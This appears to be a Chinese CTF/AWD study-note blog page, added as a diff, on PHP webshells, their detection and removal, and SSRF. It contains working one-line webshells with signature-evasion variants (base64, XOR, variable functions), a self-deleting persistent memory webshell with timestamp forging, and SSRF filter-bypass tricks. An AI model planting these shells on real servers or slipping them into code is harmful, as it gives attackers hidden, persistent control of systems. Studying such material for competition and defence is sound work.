@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="复习：上传木马 攻击成功必须满足三个条件：1、木马能成功上传到服务器2、知道木马上传到服务器的路径3、上传的木马能被解析执行eval和assert的区别：  相同点：都能把字符串作为PHP代码执行。  不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。但是php7.1以上已经废弃了assert。 木马变形传统木马防护检测一般">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web">
+<meta property="og:url" content="http://example.com/2021/02/26/web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="复习：上传木马 攻击成功必须满足三个条件：1、木马能成功上传到服务器2、知道木马上传到服务器的路径3、上传的木马能被解析执行eval和assert的区别：  相同点：都能把字符串作为PHP代码执行。  不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。但是php7.1以上已经废弃了assert。 木马变形传统木马防护检测一般">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-02-26T01:39:08.000Z">
+<meta property="article:modified_time" content="2021-05-23T01:34:32.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="一句话木马">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/26/web/" class="article-date">
+  <time class="dt-published" datetime="2021-02-26T01:39:08.000Z" itemprop="datePublished">2021-02-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>复习：上传木马 攻击成功必须满足三个条件：<br><strong>1、木马能成功上传到服务器<br>2、知道木马上传到服务器的路径<br>3、上传的木马能被解析执行</strong><br>eval和assert的区别：</p>
+<ul>
+<li><p>相同点：都能把字符串作为PHP代码执行。</p>
+</li>
+<li><p>不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。<br>但是php7.1以上已经废弃了assert。</p>
+<h3 id="木马变形"><a href="#木马变形" class="headerlink" title="木马变形"></a>木马变形</h3><p>传统木马防护检测一般是：基于特征检测的防护，如正则表达式和黑名单。</p>
+<h3 id="隐藏关键字"><a href="#隐藏关键字" class="headerlink" title="隐藏关键字"></a>隐藏关键字</h3></li>
+<li><p>绕过php代码标志&lt;?的限制<br><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>
+</li>
+<li><p>拆分拼接<br><code>&lt;?php $arr=explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); //把字符串打散为数组 $payload=$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];//拼接成assert //php版本要求:&lt;=7.0 @$payload(@$_GET[&#39;x&#39;]); ?&gt; </code></p>
+</li>
+<li><p>编码<br><code>&lt;?php   $a=base64_decode(&quot;YXNzZXJ0&quot;);   @$a($_POST(&#39;cmd&#39;)); ?&gt;</code></p>
+</li>
+<li><p>随机异或，用异或运算来组成字符<br><code>&lt;?php //也可以用十六进制进行进一步加密,例如 //$r=&quot;x4d&quot;^&quot;x3f&quot;; $a=&quot;Y&quot;^&quot;8&quot;;//a $b=&quot;T&quot;^&quot;&#39;&quot;;//s $c=&quot;*&quot;^&quot;O&quot;;//e $d=&quot;M&quot;^&quot;?&quot;;//r $e=&quot;-&quot;^&quot;Y&quot;;//t $payload=$a.$b.$b.$c.$d.$e;//拼接成assert @$payload(@$_POST[&#39;x&#39;]); ?&gt; </code></p>
+</li>
+<li><p>可变函数<br><code>&lt;?php @$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]); //传入e=assert&amp;x=command ?&gt; </code></p>
+</li>
+<li><p>可变变量<br><code>&lt;?php $a=&#39;assert&#39;; $b=&#39;a&#39;; //$$b=$a=&#39;assert&#39; $$b($_POST[&#39;x&#39;]); //assert($_POST[&#39;x&#39;]) ?&gt; </code></p>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3></li>
+</ul>
+<p>回调函数：PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。<br>如：<br>call_user_func ( $callback , $parameter)<br>$callback ：被调用的回调函数<br>$parameter：0个或以上的参数，被传入回调函数。<br><?php  
+ @call_user_func($_GET['id'],$_POST['a']);
+ //传入id=eval&a=command
+?></p>
+<h3 id="木马使用"><a href="#木马使用" class="headerlink" title="木马使用"></a>木马使用</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>system()–执行外部程序，并显示输出<br>passthru()–执行外部程序并且显示原始输出<br>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。<br>shell_exec()或<code>  </code>–通过shell环境执行命令，需要echo</p>
+<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>file_ get_contents 一将整个文件读入为一个字符串<br>file()一把整个文件读入一个数组中<br>readfile一读取一个文件，并写入到输出缓冲</p>
+<h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><p>scandir() 函数返回一个指定目录中的文件和目录的数组。</p>
+<h3 id="木马的特征与查杀（AWD）"><a href="#木马的特征与查杀（AWD）" class="headerlink" title="木马的特征与查杀（AWD）"></a>木马的特征与查杀（AWD）</h3><p>基于特征检测，检测敏感关键字，如：危险函数、特殊函数<br>工具：D盾</p>
+<h4 id="1、代码执行函数："><a href="#1、代码执行函数：" class="headerlink" title="1、代码执行函数："></a>1、代码执行函数：</h4><ul>
+<li>eval</li>
+<li>assert</li>
+<li>pre_replace</li>
+<li>create_function</li>
+<li>回调函数 call_user_func、call_user_func_array、register_tick_function、array_filter等等</li>
+<li>……………….<h4 id="2、命令执行函数："><a href="#2、命令执行函数：" class="headerlink" title="2、命令执行函数："></a>2、命令执行函数：</h4></li>
+<li>exec()–执行一个外部程序</li>
+<li>passthru()–执行外部程序并且显示原始输出</li>
+<li>proc_open()–执行一个命令，并且打开用来输入/输出的文件指针</li>
+<li>shell_exec()或<code>   </code>–通过shell环境执行命令</li>
+<li>system()–执行外部程序，并显示输出</li>
+<li>popen()–通过参数传递一条命令，并对popen打开的文件执行<h4 id="3、文件操作函数："><a href="#3、文件操作函数：" class="headerlink" title="3、文件操作函数："></a>3、文件操作函数：</h4></li>
+<li>file_ get_contents 一将整个文件读入为一个字符串</li>
+<li>file_ put_ contents 一将一个字符串写入文件</li>
+<li>file()一把整个文件读入一个数组中</li>
+<li>fopen一打开文件或者URL</li>
+<li>move_ uploaded file 一将上传的文件移动到新位置</li>
+<li>readfile一读取一个文件，并写入到输出缓冲</li>
+<li>rename一重命名一个文件或目录</li>
+<li>rmdir一删除目录</li>
+<li>unlink &amp; delete 一删除文件<h4 id="4、包含函数："><a href="#4、包含函数：" class="headerlink" title="4、包含函数："></a>4、包含函数：</h4></li>
+<li>require、require_once</li>
+<li>include、include_once<h4 id="5、特殊函数："><a href="#5、特殊函数：" class="headerlink" title="5、特殊函数："></a>5、特殊函数：</h4></li>
+<li>phpinfo</li>
+<li>变量覆盖  parse_str、extract</li>
+<li>…………………<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3>不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。<h4 id="不死马相关代码"><a href="#不死马相关代码" class="headerlink" title="不死马相关代码"></a>不死马相关代码</h4><code>&lt;?php  ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = &#39;./.index1.php&#39;; $code = &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;; //pass=nepnep 用法：pass=nepnep&amp;cmd=command while (1)&#123;   file_put_contents($file,$code);   system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .index1.php&#39;);   usleep(5000); &#125; ?&gt;</code><br>ignore_user_abort(true)：此函数用来设置 客户机断开后是否会终止脚本的执行，设置成true，客户机断开后脚本仍然会执行。<br>set_time_limit(0)：设置脚本最大执行时间，设为0表示没有限制。<br>unlink(_<em>FILE</em>_)： 删除文件本身，起到隐蔽自身的作用。<br>usleep()：延迟执行当前脚本若干微秒。<br>注：<br>pass参数使用了MD5加密，防止木马被他人利用。</li>
+</ul>
+<h4 id="不死马的查杀："><a href="#不死马的查杀：" class="headerlink" title="不死马的查杀："></a>不死马的查杀：</h4><p>1、重启服务，比如php 等web服务。</p>
+<p>2、创建一个和不死马同名的文件夹。</p>
+<p>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID 杀掉进程。</p>
+<p>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间才会有效。</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="SSRF的定义与成因"><a href="#SSRF的定义与成因" class="headerlink" title="SSRF的定义与成因"></a>SSRF的定义与成因</h4><p>SSRF(服务端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统<br>(正是因为由服务端发起，所以它能够请求到与它相连而与外网隔离的内部系统)<br>原因：服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤、限制。</p>
+<h4 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h4><ul>
+<li>内网探测</li>
+<li>利用file协议读取本地文件等等</li>
+<li>向内部任意主机的任意端口发送精心构造的payload，从而攻击内网的web应用，主要是使用GET参数就可以实现的攻击</li>
+<li>DOS攻击<h4 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="SSRF漏洞的验证"></a>SSRF漏洞的验证</h4>1、排除法，F12查看源码，看是否在本地进行请求<br>如：xxx?image=(地址)的就可能存在SSRF漏洞。<br>2、dnslog等工具进行测试，看是否被访问。<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4>1、加端口<br>2、短网址<br>3、指向任意IP的域名xip.io<br>4、IP限制绕过<br>十进制转换、八进制转换、十六进制转换<br>5、@绕过<br>访问的是@后面的网址<br>6、后面跟参数</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/26/web/" data-id="ckr3hbgsj001p4cvogc2b1f2b" data-title="web" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/13/SSTI%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SSTI注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/08/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">PHP伪协议</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">DVWAsql注入和文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" rel="tag">cs简单利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="tag">kali网络配置问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" rel="tag">msf简单使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">DVWAsql注入和文件上传</a> <a href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">PHP伪协议</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" style="font-size: 10px;">cs简单利用</a> <a href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" style="font-size: 10px;">kali网络配置问题</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">msf简单使用</a> <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">一句话木马</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 10px;">攻防世界</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 15px;">文件上传</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 12.5px;">暴力破解</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/08/buu4/">buu4</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">CTF-SQL注入进阶</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/">CTF-脚本基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/">CTF-PHP序列化安全</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/">CTF-XXE注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
